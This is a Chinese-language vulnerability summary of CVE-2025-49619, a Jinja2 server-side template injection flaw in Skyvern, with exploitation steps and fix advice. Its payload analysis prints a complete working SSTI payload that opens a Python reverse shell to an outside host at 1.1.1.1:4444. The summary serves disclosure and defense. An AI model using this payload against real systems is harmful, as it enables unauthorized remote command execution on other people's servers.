## CVE-2025-49619 - Skyvern Jinja Runtime Leak

**漏洞编号:** CVE-2025-49619

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Skyvern

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 0.1.85

**利用条件:** 需要Skyvern的URL和有效的API Key

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-49619 是 Skyvern <= 0.1.85 版本中的一个服务器端模板注入（SSTI）漏洞，位于 `sdk/workflow/models/block.py` 文件中。攻击者可以通过在 Jinja2 模板中注入恶意代码，实现在服务器端执行任意命令。 

**有效性：**

提供的PoC代码看起来是有效的。它利用了 Jinja2 模板注入漏洞，通过创建包含恶意 Jinja2 表达式的工作流，在 Skyvern 服务器上执行反弹 shell 命令。PoC 代码结构清晰，包含必要的参数（目标 URL，API 密钥，本地 IP 和端口），并且提供了如何启动监听器和运行 exploit 的详细说明。

**投毒风险：**

分析提供的 PoC 代码，并未发现明显的投毒代码。PoC 代码的功能是利用已知的 SSTI 漏洞，构造包含恶意 Jinja2 表达式的工作流，目的是在目标服务器上执行反弹 shell。代码中对反弹 shell 的 IP 地址和端口进行了参数化，增加了代码的灵活性，没有发现隐藏的、未经声明的恶意行为。因此，投毒风险为0%。

**利用方式：**

1.  **漏洞定位：** 该漏洞存在于 Skyvern 的工作流编辑器中，允许用户在 Prompt 字段中使用 Jinja2 模板语法。
2.  **利用过程：**
    *   攻击者首先需要获取 Skyvern 的 API 密钥。
    *   攻击者构造一个包含恶意 Jinja2 表达式的工作流定义。这个表达式的目的是执行系统命令，例如反弹 shell。
    *   攻击者使用 API 密钥向 Skyvern 服务器发送包含恶意工作流定义的 POST 请求。
    *   Skyvern 服务器在渲染包含恶意 Jinja2 表达式的 Prompt 字段时，会执行其中的系统命令。
    *   如果攻击者在自己的机器上设置了监听器，就可以收到反弹 shell。
3.  **Payload 分析：**
    *  `{% for x in ().__class__.__base__.__subclasses__() %}`: 遍历所有子类。
    *  `{% if 'warning' in x.__name__ %}`: 查找名称中包含“warning”的类 (通常是警告相关的类)。
    *  `{{ x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"1.1.1.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"sh\")'").read() }}`:  导入 `os` 模块，使用 `popen` 函数执行反弹 shell 命令。这个命令使用 Python 创建一个 socket 连接到攻击者的机器，并将标准输入、输出和错误重定向到 socket，然后启动一个 shell。
4.  **修复建议：** 修复此漏洞需要对用户输入进行严格的过滤和转义，防止恶意 Jinja2 表达式的注入。此外，还可以考虑使用沙箱环境来限制模板引擎的权限。

**项目地址:** [cristibtz/CVE-2025-49619](https://github.com/cristibtz/CVE-2025-49619)

**漏洞详情:** [CVE-2025-49619](https://nvd.nist.gov/vuln/detail/CVE-2025-49619)